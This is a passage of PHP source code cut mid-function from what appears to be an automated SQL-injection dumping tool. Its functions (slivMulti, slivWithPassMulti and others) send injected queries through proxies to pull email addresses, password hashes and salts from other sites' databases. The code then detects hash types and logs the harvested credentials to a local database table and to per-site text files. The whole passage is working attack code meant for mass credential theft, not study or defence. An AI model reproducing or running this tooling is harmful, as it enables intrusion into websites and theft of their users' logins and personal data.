							$this->tmp2[] = strlen($pass);
							$this->tmp5[] = strlen($z[0]);

							if ($this->hashtype == '0') {
								if (($key2 !== false) && ($this->k < 6)) {
									$this->l2++;

									if (7 < $this->l2) {
										$this->hashtype = 'unkown';
									}

								}
								 else {
									$this->k++;
								}
							}


							if ($key5 !== false) {
								$this->l5++;

								if (($this->dlina < $this->l5) && ($this->up == false)) {
									$this->logs('$this->l5 > 75:' . $this->r, 'slivWithPassConcastMulti');
									$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
									$this->Post->query('UPDATE  `multis` SET  `prich` = \'this->l5 > ' . $this->dlina . ' odonakovie po dline\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

									return 'vpizdu';
								}

							}
							 else {
								$this->l5--;
							}

							if ($this->salt == true) {
								$pass = $pass . ':' . $salt_new;
								$this->Post->query('INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $p[0] . '\',\'' . $pass . '\',now(),\'' . $url['host'] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
							}
							 else {
								$this->Post->query('INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $p[0] . '\',\'' . $pass . '\',now(),\'' . $url['host'] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
							}

							echo 'OK<br>';
						}
						 else {
							$this->email_gavno++;

							if (($this->email_gavno == $this->email_bad) && ($this->up == false)) {
								echo 'Mnogo email_gavno $this->email_bad';
								$this->logs('Mnogo email_gavno:' . $this->r, 'slivWithPassConcastMulti');
								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo email_gavno ' . $this->email_bad . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

								return 'vpizdu';
							}

						}
					}
					 else {
						$this->null++;
						$this->d($this->null, 'count NULL TRIM');

						if ($this->null == $this->null_count) {
							$this->d('Много пустных или null ' . $this->null);
							$this->logs('Mnogo null:' . $this->null . ' ' . $this->r, 'slivWithPassConcastMulti');
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `prich` = \'Mnogo null ' . $this->null_count . '\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

							return 'vpizdu';
						}

					}

					flush();
				}
			}
			 else {
				$this->emp++;

				if ($this->emp == $this->hunta) {
					$this->d($this->emp, '$this->emp = 55vpizdu');
					$this->logs($this->emp . ' $this->emp = 55vpizdu:' . $this->r, 'slivWithPassConcastMulti');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich`=\'this->hunta ' . $this->hunta . ' = vpizdu vashe pusto\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
					return 'vpizdu';
				}

			}

			++$i;
		}

		$this->Post->query('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

		if ($this->sliv_pass_save == true) {
			fclose($fh);
		}

	}

	public function slivWithPassMulti($id = 2, $potok = 1, $lastlimit = 0, $oneCount = 0)
	{
		if (!(isset($this->raznica_dump)) || ($this->raznica_dump == '')) {
			$this->raznica_dump = 60;
		}


		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$this->d('slivWithPassMulti activ!');
		$hunta = 1;
		$mail = $this->Filed->findbyid($id);
		$filed_id = $mail['Filed']['id'];
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET dump odin');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];

		if ($this->sliv_pass_save == true) {
			if ($this->salt == true) {
				$filename = './slivpass_save_solt/' . $url['host'] . $mail['Filed']['table'] . '.txt';
				$fh = fopen($filename, 'a+');
			}
			 else {
				$filename = './slivpass_save/' . $url['host'] . $mail['Filed']['table'] . '.txt';
				$fh = fopen($filename, 'a+');
			}

			fwrite($fh, $squle[0]['posts']['url'] . "\n");
		}


		$pass_f2 = explode(':', $mail['Filed']['password']);
		$pass_f = $pass_f2[1];
		$salt2 = explode(':', $mail['Filed']['salt']);
		$salt_new = $salt2[1];
		$time = time();
		$null = 0;
		$l = 0;
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp_pass = 0;
		$this->logs($url['host'] . ' ' . $lastlimit . '-function lastlimit:' . $this->r, 'slivWithPassMulti');
		$this->logs($url['host'] . ' ' . $oneCount . '-function oneCount:' . $this->r, 'slivWithPassMulti');
		$this->logs($url['host'] . ' ' . $potok . '-function potok:' . $this->r, 'slivWithPassMulti');
		$this->logs($url['host'] . ' ' . ceil($lastlimit + $oneCount) . '-function lastlimit+$oneCount:' . $this->r, 'slivWithPassMulti');
		$i = $lastlimit;

		while ($i < ceil($lastlimit + $oneCount)) {
			$this->workup();
			$new = time();
			$razn = $new - $time;

			if ($this->raznica_dump < $razn) {
				$this->d($razn . '-razn slivMultiOnePass > 25:' . $this->r);
				$this->logs($razn . '-razn slivMultiOnePass > 25:' . $this->r);
				$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				$this->Post->query('UPDATE  `multis` SET  `prich`=\'function razn slivMultiOnePass > 25\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				return 'vpizdu';
			}


			$time = time();
			$this->Post->query('UPDATE  `multis` SET  `lastlimit` = ' . $lastlimit . ',`date`= ' . $time . ',`pid`=' . $this->pid . ' WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

			if ($this->salt == true) {
				$mysql = $this->mysqlInj->mysqlGetValue($bd[1], $mail['Filed']['table'], array($mail['Filed']['label'], $pass_f, $salt_new), $i, array(), ' WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ')');
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue($bd[1], $mail['Filed']['table'], array($mail['Filed']['label'], $pass_f), $i, array(), ' WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ')');
			}

			$this->d($mysql, 'multi pass one');

			if (trim($mysql[$mail['Filed']['label']]) !== '') {
				if (!(isset($mysql[$pass_f]))) {
					$pass = '';
				}
				 else {
					$pass = trim($mysql[$pass_f]);
				}

				if (!(isset($mysql[$salt_new]))) {
					$sss_salt = '';
				}
				 else {
					$sss_salt = trim($mysql[$salt_new]);
				}

				if ($pass == '') {
					$this->emp_pass++;
				}


				if (($this->pass_empty < $this->emp_pass) && ($this->up == false)) {
					$this->logs('$this->emp_pass > 125:' . $this->r, 'slivWithPassMulti');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'emp_pass > 175 pass pustie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					return 'vpizdu';
				}


				if ($this->salt == true) {
					echo $mysql[$mail['Filed']['label']] . ':' . $mysql[$pass_f] . ':' . $mysql[$salt_new] . '<br/>';
				}
				 else {
					echo $mysql[$mail['Filed']['label']] . ':' . $mysql[$pass_f] . '<br/>';
				}

				if ($this->sliv_pass_save == true) {
					if ($this->salt == true) {
						fwrite($fh, $mysql[$mail['Filed']['label']] . ':' . $mysql[$pass_f] . ':' . $mysql[$salt_new] . "\n");
					}
					 else {
						fwrite($fh, $mysql[$mail['Filed']['label']] . ':' . $mysql[$pass_f] . "\n");
					}
				}


				$ht = $this->hashtype($mysql[$pass_f]);

				if ($ht != 1) {
					$this->hashtype = $ht;
				}
				 else {
					$this->hashtype = '0';
				}

				@$key0 = array_search($pass, $this->stopword);

				if (($key0 === false) && (2 < strlen($pass)) && ($pass != 'null')) {
					$pass2 = $mysql[$pass];
					preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $mysql[$mail['Filed']['label']], $z);

					if ($z[0] != '') {
						$m = explode('@', $z[0]);
						@$key = array_search($pass2, $tmp);
						@$key2 = array_search(strlen($pass2), array_slice($this->tmp2, count($this->tmp2) - 1));
						@$key3 = array_search($mysql[$mail['Filed']['label']], $tmp3);
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
						$this->tmp5[] = strlen($z[0]);
						$this->tmp2[] = strlen($pass2);
						$tmp[] = $pass2;
						$tmp3[] = $mysql[$mail['Filed']['label']];
						$this->d(array_slice($this->tmp2, count($this->tmp2) - 1), 'slice');
						$this->d(strlen($pass2), 'strlen');

						if ($this->hashtype == '0') {
							$this->d($this->hashtype, 'hash');

							if (($key2 !== false) && ($this->k < 6)) {
								$this->l2++;

								if (7 < $this->l2) {
									$this->hashtype = 'unkown';
								}

							}
							 else {
								$this->k++;
							}
						}


						if ($key5 !== false) {
							$this->l5++;
							$this->d($this->l5, 'буква L5');

							if (($this->dlina < $this->l5) && ($this->up == false)) {
								$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
								$this->Post->query('UPDATE  `multis` SET  `prich`=\'function this->l5 > ' . $this->dlina . ' mnogo odinakovih\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
								return 'vpizdu';
							}

						}
						 else {
							$this->l5--;
						}

						if ($this->salt == true) {
							$kkk = $mysql[$pass] . ':' . $mysql[$salt_new];
							$this->Post->query('INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $mysql[$mail[Filed][label]] . '\',\'' . $kkk . '\',now(),\'' . $url[host] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
						}
						 else {
							$this->Post->query('INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $mysql[$mail[Filed][label]] . '\',\'' . $mysql[$pass] . '\',now(),\'' . $url[host] . '\',\'' . $this->hashtype . '\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
						}

						echo 'OK<br>';
					}

				}
				 else {
					++$null;

					if ($null == $this->null_count) {
						echo 'Много пустых или null';
						$this->logs('Mnogo null vpizdu:' . $this->r, 'slivWithPassMulti');
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis` SET  `prich`=\'function Mnogo null vpizdu ' . $this->null_count . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						return 'vpizdu';
					}

				}

				flush();
				$hunta = 0;
			}
			 else {
				$hunta = $hunta + 1;
				echo $hunta . '<br>';
			}

			if ($hunta == $this->hunta) {
				fclose($fh);
				$this->logs('$hunta = 20 vpizdu:' . $this->r, 'slivWithPassMulti');
				$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				$this->Post->query('UPDATE  `multis` SET  `prich`=\'function hunta vashe vibrat ne mojet LIMIT ' . $this->hunta . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				return 'vpizdu';
			}


			++$i;
		}

		$this->Post->query('UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

		if ($this->sliv_pass_save == true) {
			fclose($fh);
		}

	}

	public function slivMulti($id = 0)
	{
		if (!(isset($this->raznica_dump)) || ($this->raznica_dump == '')) {
			$this->raznica_dump = 60;
		}


		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$mail = $this->Filed->findbyid($id);
		$filed_id = $mail['Filed']['id'];
		$this->logs($filed_id . '-$filed_id:' . $this->r, 'slivMulti');
		$squle = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');

		if (count($squle) == 0) {
			$this->d($squle, '$squle BAD');
			$data = $this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `post_id` = ' . $mail['Filed']['post_id']);
			$this->d('squle pusto  zavershaem !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `post_id` = ' . $mail['Filed']['post_id']);
			return 'vpizdu';
		}


		$this->d($squle, '$squle GOOD');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$this->d($set, 'SET emailS');
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);

		if ($ff == '') {
			$ff = 0;
		}


		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$multi = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$tmpCount = $count - $mail['Filed']['lastlimit'];
		$oneCount = $tmpCount / $settings['potok'];
		$shag = $this->shag;
		$zapr = round($oneCount / $shag);

		if ($zapr == 0) {
			$zapr = 1;
		}


		$this->d($zapr, 'zapr pervuy');
		$this->d($oneCount . ' oneCount perviy');
		$this->logs($zapr . ' zapr perviy:' . $this->r, 'slivMulti');
		$this->logs($oneCount . ' oneCount perviy:' . $this->r, 'slivMulti');
		flush();

		if ($multi[0][0]['count(*)'] == 0) {
			if ($count < $this->potok_dump_one) {
				$shag = $shag - 10;
				$oneCount = $count;
				$zapr = round($oneCount / $shag);
				$this->d($zapr, '$zapr 5000');
				$this->logs($zapr . ' $zapr 5000:' . $this->r, 'slivMulti');
				$this->Post->query('UPDATE  `fileds` SET  `get` =  \'2\', `multi` = 2 WHERE  `id` =' . $filed_id);
			}


			$potok = 1;

			if ($ff == 0) {
				$start = 0;
			}
			 else {
				$start = $ff;
			}

			$numPotok = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id`=' . $filed_id);
			$this->d($numPotok, '$numPotok');

			if ($numPotok[0][0]['count(*)'] == 0) {
				$f = 'slivMulti';
				$this->d('pervyu potok !!!!!!!!!');
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				$date = time();
				$tmpCount1 = $oneCount + $start;
				$this->Post->query('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')');
				$this->d('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')');
				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
			}

		}
		 else {
			$zav0 = $this->Post->query('SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id`=' . $filed_id . ' limit 1');
			$this->d('SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id`=' . $filed_id . ' limit 1', 'zav0 zapro');
			$this->d($zav0, 'ставим статус 2, где было уже 3 попытки');

			if ($zav0[0]['multis']['get'] == 3) {
				$this->d('ku zav0');
				$this->d('$zav0 result $zav0[0][multis][get] == 3');

				if ($this->Post->query('UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id)) {
					$this->d('update kuZav uspeshno');
				}
				 else {
					$this->d('UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id, 'OK');
				}

				return 'vpizdu';
			}


			$this->d('ku1');
			$zav = $this->Post->query('SELECT * FROM  `multis` WHERE `get`=3 AND `dok` < 1 AND `filed_id`=' . $filed_id . ' limit 1');

			if ($zav[0]['multis']['get'] == 3) {
				$dok = $zav[0]['multis']['dok'] + 1;
				$this->d($zav, 'zav');
				$this->Post->query('UPDATE  `multis` SET  `get` =  1,`dok`=' . $dok . ' WHERE  `potok` = ' . $zav[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $zav[0]['multis']['potok'] . ' WHERE  `time_start` =' . $this->timeStart);
				$start = $zav[0]['multis']['lastlimit'];
				$oneCount = $zav[0]['multis']['count'];
				$potok = $zav[0]['multis']['potok'];
				$shag = $shag - 10;
				$oneCount = $oneCount - $start;
				$zapr = round($oneCount / $shag);
				$this->d($zapr, '$zapr get 3');
			}
			 else {
				$this->d('ku2');
				$allPotok = $multi[0][0]['count(*)'];
				$next = $this->Post->query('SELECT * FROM  `multis` WHERE `potok` = ' . $allPotok . ' AND `filed_id`=' . $filed_id);
				$this->d($allPotok, '$allPotok');
				$this->d($next, '$next - infa o poslednem potoke');
				$start = $next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count'] + $oneCount;
				$oneCount = $oneCount - 10;
				$potok = $next[0]['multis']['potok'] + 1;

				if ($count < $oneCount) {
					$this->d($oneCount . ' > ' . $count . '  : oneCount > count');
					$oneCount = $count - 100;
					$start = $start - 100;

					if (6 <= $potok) {
						$potok = 6;
						$this->d('potok > 6 oneCount > count SLIV');

						if ($this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id)) {
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id);
							$this->d('YES update potok > 6 oneCount > count sliv prosto');
						}


						return 'vpizdu';
					}

				}


				if ($oneCount < $count) {
					if ($multi[0][0]['count(*)'] < $settings['potok']) {
						$numPotok = $this->Post->query('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id`=' . $filed_id);

						if ($numPotok[0][0]['count(*)'] == 0) {
							$f = 'slivMulti';
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							$date = time();

							if ($this->Post->query('INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $oneCount . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')')) {
								$this->d($potok . ' $potok YES insert zapis');
								$this->logs($potok . ' - potok; YES insert zapis:' . $this->r, 'slivMulti');
							}
							 else {
								$this->d($potok . ' $potok NO!!!! insert zapis');
								$this->logs($potok . ' - potok;NO!!! insert zapis:' . $this->r, 'slivMulti');
							}

							$this->Post->query('UPDATE  `starts` SET  potok = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
						}
						 else {
							$this->d('SELECT count(*) FROM  `multis` WHERE `potok` = ' . $potok . ' AND `filed_id`=' . $filed_id, 'EST UJE POTOK TAKOY!!!');
							$this->d($numPotok, '$numPotok');
							$this->d('POTOK UJE EST v multis status get=3 stavim slivmulti');
							$this->logs('POTOK UJE EST v multis status get=3 stavim slivmulti' . $this->r, 'slivMulti');
							$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							return 'vpizdu';
						}
					}
					 else {
						$this->d('$multis[0][0][count(*)] <= $settings[potok]');
						$this->logs('$multis[0][0][count(*)] <= $settings[potok]:' . $this->r, 'slivMulti');

						if (6 < $potok) {
							$potok = 6;
							$this->d('potok > 6');
						}


						$this->d('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
						$this->logs('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id . ':' . $this->r, 'slivMulti');
						$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
						return 'vpizdu';
					}
				}

			}
		}

		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];

		if ($this->sliv_save == true) {
			$filename = './sliv_save/' . $url['host'] . '.txt';
			$fh = fopen($filename, 'a+');
		}


		$d = 0;
		$time = time();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->emp = 0;
		$this->key300 = 0;
		$this->email_gavno = 0;
		$this->logs($url['host'] . ' ' . $zapr . '-zapr poslednyi:' . $this->r, 'slivMulti');
		$this->logs($url['host'] . ' ' . $oneCount . '-oneCount:' . $this->r, 'slivMulti');
		$this->logs($url['host'] . ' ' . $count . '-count:' . $this->r, 'slivMulti');
		$this->logs($url['host'] . ' ' . $start . '-start:' . $this->r, 'slivMulti');
		$this->logs($url['host'] . ' ' . $potok . '-potok:' . $this->r, 'slivMulti');
		$this->d($zapr . '-zapr poslednyi:' . $this->r);
		$this->d(round($oneCount) . '-oneCount:' . $this->r);
		$this->d($count . '-count:' . $this->r);
		$this->d($start . '-start:' . $this->r);
		$this->d($potok . '-potok:' . $this->r);
		flush();
		$i = 0;

		while ($i < $zapr) {
			echo $i . '-i<br>';
			$this->workup();
			$new = time();
			$razn = $new - $time;

			if ($this->raznica_dump < $razn) {
				$this->d($razn . '-razn slivMulti > 25:' . $this->r);
				$this->logs($url['host'] . ' ' . $razn . '-razn slivMulti > 25:' . $this->r, 'slivMulti');
				$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
				$this->Post->query('UPDATE  `multis` SET  `prich` = \'razn slivMulti > 25\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
				return 'vpizdu';
			}


			$time = time();
			++$d;
			$this->Post->query('UPDATE  `multis` SET  `lastlimit` = ' . $start . ',`date` = ' . $time . ',`pid`=' . $this->pid . ' WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
			$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT ' . $mail['Filed']['label'] . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')', 0, array());
			$start2 = $start;
			$start = $start + $shag;
			$this->d($mysql, 'mysql');

			if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']))) {
				$shag_new = $shag - 10;
				$mysql_new = $this->mysqlInj->mysqlGetValue('', '(SELECT ' . $mail['Filed']['label'] . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` WHERE `' . $mail['Filed']['label'] . '` LIKE char(' . $this->charcher('%@%') . ') LIMIT ' . $start . ',' . $shag_new . ')t ', 'GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')', 0, array());
				$this->d($mysql_new, '$mysql_new');

				if (isset($mysql_new['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')'])) {
					$this->d('shag nado menshe');
					$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
					$this->Post->query('UPDATE  `multis` SET  `prich` = \'UMENSHEN SHAG - minus 10\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
					return 'vpizdu';
				}

			}


			if (($i == 0) && !(isset($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']))) {
				$this->d('slivoneMulti ->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>');

				if ($this->sliv_save == true) {
					fclose($fh);
				}


				$this->Post->query('UPDATE  `multis` SET  `function` = 1 WHERE  `potok` =' . $potok . ' AND `filed_id`=' . $filed_id);
				$this->d('function = 1:' . $this->r);
				$this->logs($url['host'] . ' function = 1:' . $this->r, 'slivMulti');

				if ($this->slivoneMulti($id, $potok, $start2, $oneCount) == 'vpizdu') {
					return 'vpizdu';
				}


				return;
			}


			flush();

			if (trim($mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']) !== '') {
				$mails = explode(',', $mysql['GROUP_CONCAT(t.' . $mail['Filed']['label'] . ')']);
				$tmp = array();
				$tmp3 = array();

				foreach ($mails as $value ) {
					if ($this->sliv_save == true) {
						if (trim($value) !== '') {
							fwrite($fh, trim($value) . "\n");
						}

					}


					preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $value, $z);

					if ($z[0] != '') {
						@$key = array_search($z[0], $tmp);
						@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2) - 1));
						$this->tmp2[] = strlen($z[0]);
						$tmp[] = $z[0];

						if ($key === false) {
							$this->key300++;

							if ($this->up == true) {
								if ($this->key300 == 3300) {
									$tmp = array();
								}

							}
							 else if ($this->key300 == 300) {
								$tmp = array();
							}


							echo $value . '<br>';
							$m = explode('@', $z[0]);

							if ($key2 !== false) {
								$this->l2++;
								$this->d($this->l2, 'l2');

								if ($this->up == true) {
									if ((10000 < $this->l2) && ($this->up == false)) {
										$this->d($this->l2, 'vpizdu 10000 ');
										$this->logs($url['host'] . ' $this->l2 vpizdu 10000 :' . $this->r, 'slivMulti');
										$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
										$this->Post->query('UPDATE  `multis` SET  `prich` = \'10000 sliv multis this->l2 vpizdu po dline mnogo pohojih\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

										return 'vpizdu';
									}

								}
								 else if ((40 < $this->l2) && (10000 < $this->l2) && ($this->up == false)) {
									$this->d($this->l2, 'vpizdu');
									$this->logs($url['host'] . ' $this->l2 vpizdu 40:' . $this->r, 'slivMulti');
									$this->Post->query('UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
									$this->Post->query('UPDATE  `multis` SET  `prich` = \'sliv multis this->l2 vpizdu po dline mnogo pohojih 40\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

									return 'vpizdu';
								}

							}
							 else {
								$this->l2--;
							}

							$this->Post->query('INSERT INTO `mails_one` (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES(\'' . $z[0] . '\',\'0\',now(),\'' . $url['host'] . '\',\'0\',\'' . $bd[1] . '\',\'' . $zone . '\',\'' . $m[1] . '\')');
						}
						 else {
							++$l;

							if (($l == $this->dlina) && ($this->up == false)) {
